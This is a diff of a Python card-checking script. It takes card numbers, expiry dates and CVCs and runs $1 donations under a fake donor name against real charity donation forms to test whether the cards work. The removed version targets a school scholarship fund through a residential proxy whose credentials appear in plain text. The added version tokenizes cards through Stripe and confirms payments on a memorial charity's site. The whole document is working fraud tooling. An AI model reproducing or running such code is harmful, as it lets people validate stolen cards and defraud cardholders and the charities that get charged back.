@@ -1,10 +1,6 @@
 import requests,re
 import random
-from proxy import reqproxy, make_request
 def Tele(ccx):
-	proxy_str = "brd.superproxy.io:33335:brd-customer-hl_b7987ef2-zone-mass:gvqtoo4v78v8"
-	session, ip = reqproxy(proxy_str)
-	#print(f"IP Address: {ip}")
 	ccx=ccx.strip()
 	n = ccx.split("|")[0]
 	mm = ccx.split("|")[1]
@@ -12,73 +8,132 @@ def Tele(ccx):
 	cvc = ccx.split("|")[3]
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
-	if "01" in mm or "02" in mm or "03" in mm or "04" in mm or "05" in mm or "06" in mm or "07" in mm or "08" in mm or "09" in mm:
-		mm = mm.split("0")[1]
 	r = requests.session()
 	
-	random_amount1 = random.randint(1, 3)
+	random_amount1 = random.randint(1, 4)
 	random_amount2 = random.randint(1, 99)
 
 	headers = {
-	    'authority': 'www.stmichaels.vic.edu.au',
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
-	    'cache-control': 'max-age=0',
-	    #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryOPUScQ1YAZ6qBXLA',
-	    'origin': 'https://www.stmichaels.vic.edu.au',
-	    'referer': 'https://www.stmichaels.vic.edu.au/scholarship-fund/',
+	    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Cache-Control': 'max-age=0',
+	    'Connection': 'keep-alive',
+	    'Sec-Fetch-Dest': 'document',
+	    'Sec-Fetch-Mode': 'navigate',
+	    'Sec-Fetch-Site': 'none',
+	    'Sec-Fetch-User': '?1',
+	    'Upgrade-Insecure-Requests': '1',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'iframe',
-	    'sec-fetch-mode': 'navigate',
-	    'sec-fetch-site': 'same-origin',
-	    'sec-fetch-user': '?1',
-	    'upgrade-insecure-requests': '1',
+	}
+	
+	response = requests.get('https://remember.org.au/donate/', headers=headers)
+	
+	form_id = re.search(r'name="charitable_form_id" value="(.*?)"', response.text).group(1)
+	donation_nonce = re.search(r'name="_charitable_donation_nonce" value="(.*?)"', response.text).group(1)
+	
+	headers = {
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
 	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
 	}
 	
-	files = [
-	    ('input_32', (None, '')),
-	    ('input_30.3', (None, 'Gen')),
-	    ('input_30.6', (None, 'Paypal')),
-	    ('input_3', (None, 'genpaypal01@gmail.com')),
-	    ('input_31.1', (None, '27 Allen St')),
-	    ('input_31.3', (None, 'New York')),
-	    ('input_31.4', (None, 'New York')),
-	    ('input_31.5', (None, '10080')),
-	    ('input_31.6', (None, 'United States')),
-	    ('input_9', (None, '4303000850')),
-	    ('input_10', (None, 'Current staff')),
-	    ('input_14', (None, 'Choose Amount|0')),
-	    ('input_27', (None, '$1.00')),
-	    ('input_18.1', (None, f'{n}')),
-	    ('input_18.2[]', (None, f'{mm}')),
-	    ('input_18.2[]', (None, f'20{yy}')),
-	    ('input_18.3', (None, f'{cvc}')),
-	    ('input_18.5', (None, 'Gen Paypal')),
-	    ('input_21', (None, '')),
-	    ('input_28', (None, '1')),
-	    ('gform_ajax', (None, 'form_id=1&title=&description=&tabindex=0&theme=legacy&styles=[]&hash=a8b2d398df14ac18d6e234371a51a969')),
-	    ('gform_submission_method', (None, 'iframe')),
-	    ('gform_theme', (None, 'legacy')),
-	    ('gform_style_settings', (None, '[]')),
-	    ('is_submit_1', (None, '1')),
-	    ('gform_submit', (None, '1')),
-	    ('gform_unique_id', (None, '6943d1311e43b')),
-	    ('state_1', (None, 'WyJ7XCIxNFwiOltcIjkzMjI5MzMyZDk2MmRiMGI1NWIxMjg3YTNhOWI3OThkXCIsXCJkNmE4NGViNWQwMjgwOTIwMzJkYmFmZDJhZTIxM2NhOFwiLFwiYjU4ZWZkM2E3MWE0NmRmMTMwZTBhYTZhZDJjYzMyOTFcIixcIjRmZTI4ZTFiMGVhMjk2OGVlNzVmM2VlMjE2NjI0ODQ2XCIsXCI1NTZhOTY3ZmQzYjM5M2YzZWFmNjNjZjc3YjYwMDViOVwiLFwiMzYwYjQ2YzVhODI1YjY0MzczYjk4ODIwN2ZlYWU0NWVcIixcIjIxYWZiZGUwMjI5NDYyNThmMTFmOTA2YTY0OWU2MTkyXCJdfSIsIjY3YTAwNzQ1NThkNWY1NDQ2NjM0NDFkYzg3MjUxODQyIl0=')),
-	    ('gform_target_page_number_1', (None, '0')),
-	    ('gform_source_page_number_1', (None, '1')),
-	    ('gform_field_values', (None, '')),
-	    ('version_hash', (None, 'f72b951c73c11f86bd87dad208223300')),
-	    ('gform_submission_speeds', (None, '{"pages":{"1":[78370]}}')),
-	]
+	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+card-element&key=pk_live_51P0v83B09gpyA2Juu5SSq35nUSMyDWVutWv5RAWYv2XeUviqlqhfV5JlBgK64uhOVb0LWcthjR2aJwo5NkNfimZr00g4SiBFrz'
 	
-	response = sessions.post('https://www.stmichaels.vic.edu.au/scholarship-fund/', headers=headers, files=files)
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	
+	pm = response.json()['id']
+	
+	headers = {
+	    'Accept': 'application/json, text/javascript, */*; q=0.01',
+	    'Accept-Language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'Connection': 'keep-alive',
+	    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    'Origin': 'https://remember.org.au',
+	    'Referer': 'https://remember.org.au/donate/',
+	    'Sec-Fetch-Dest': 'empty',
+	    'Sec-Fetch-Mode': 'cors',
+	    'Sec-Fetch-Site': 'same-origin',
+	    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+	    'X-Requested-With': 'XMLHttpRequest',
+	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	}
+	
+	data = {
+	    'charitable_form_id': f'{form_id}',
+	    f'{form_id}': '',
+	    '_charitable_donation_nonce': f'{donation_nonce}',
+	    '_wp_http_referer': '/donate/',
+	    'campaign_id': '13890',
+	    'description': 'Donate',
+	    'ID': '0',
+	    'gateway': 'stripe',
+	    'donation_amount': 'custom',
+	    'custom_donation_amount': '1.00',
+	    'title': '',
+	    'first_name': 'Gen',
+	    'last_name': 'Paypal',
+	    'email': 'genpaypal01@gmail.com',
+	    'phone_type': '0',
+	    'phone': '4303000850',
+	    'address': '',
+	    'city': '',
+	    'state': '0',
+	    'postcode': '',
+	    'country': 'AU',
+	    'donation_reason': '',
+	    'stripe_payment_method': f'{pm}',
+	    'action': 'make_donation',
+	    'form_action': 'make_donation',
+	}
+	
+	response = requests.post('https://remember.org.au/wp-admin/admin-ajax.php', headers=headers, data=data)
 	
 	try:
-		result = re.search(r"class='gfield_description validation_message gfield_validation_message'>(.*?)<\/div><\/li>", response.text).group(1)
-	except:
-		result = response.text
+		scrt = response.json().get('secret')
+		if not scrt:
+			return response.text
+		pi = re.search(r"(pi_[^_]+)", scrt)
+		pi = pi.group(1)
+	except Exception:
+		return response.text	
 	
-	return result
+	headers = {
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
+	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+	}
+	
+	data = f'expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51P0v83B09gpyA2Juu5SSq35nUSMyDWVutWv5RAWYv2XeUviqlqhfV5JlBgK64uhOVb0LWcthjR2aJwo5NkNfimZr00g4SiBFrz&client_attribution_metadata[client_session_id]=ee8d412f-c6a6-47a3-a1ee-1ccae1178a5b&client_attribution_metadata[merchant_integration_source]=l1&client_secret={scrt}'
+	
+	response = requests.post(
+	    f'https://api.stripe.com/v1/payment_intents/{pi}/confirm',
+	    headers=headers,
+	    data=data,
+	)
+	
+	return response.text
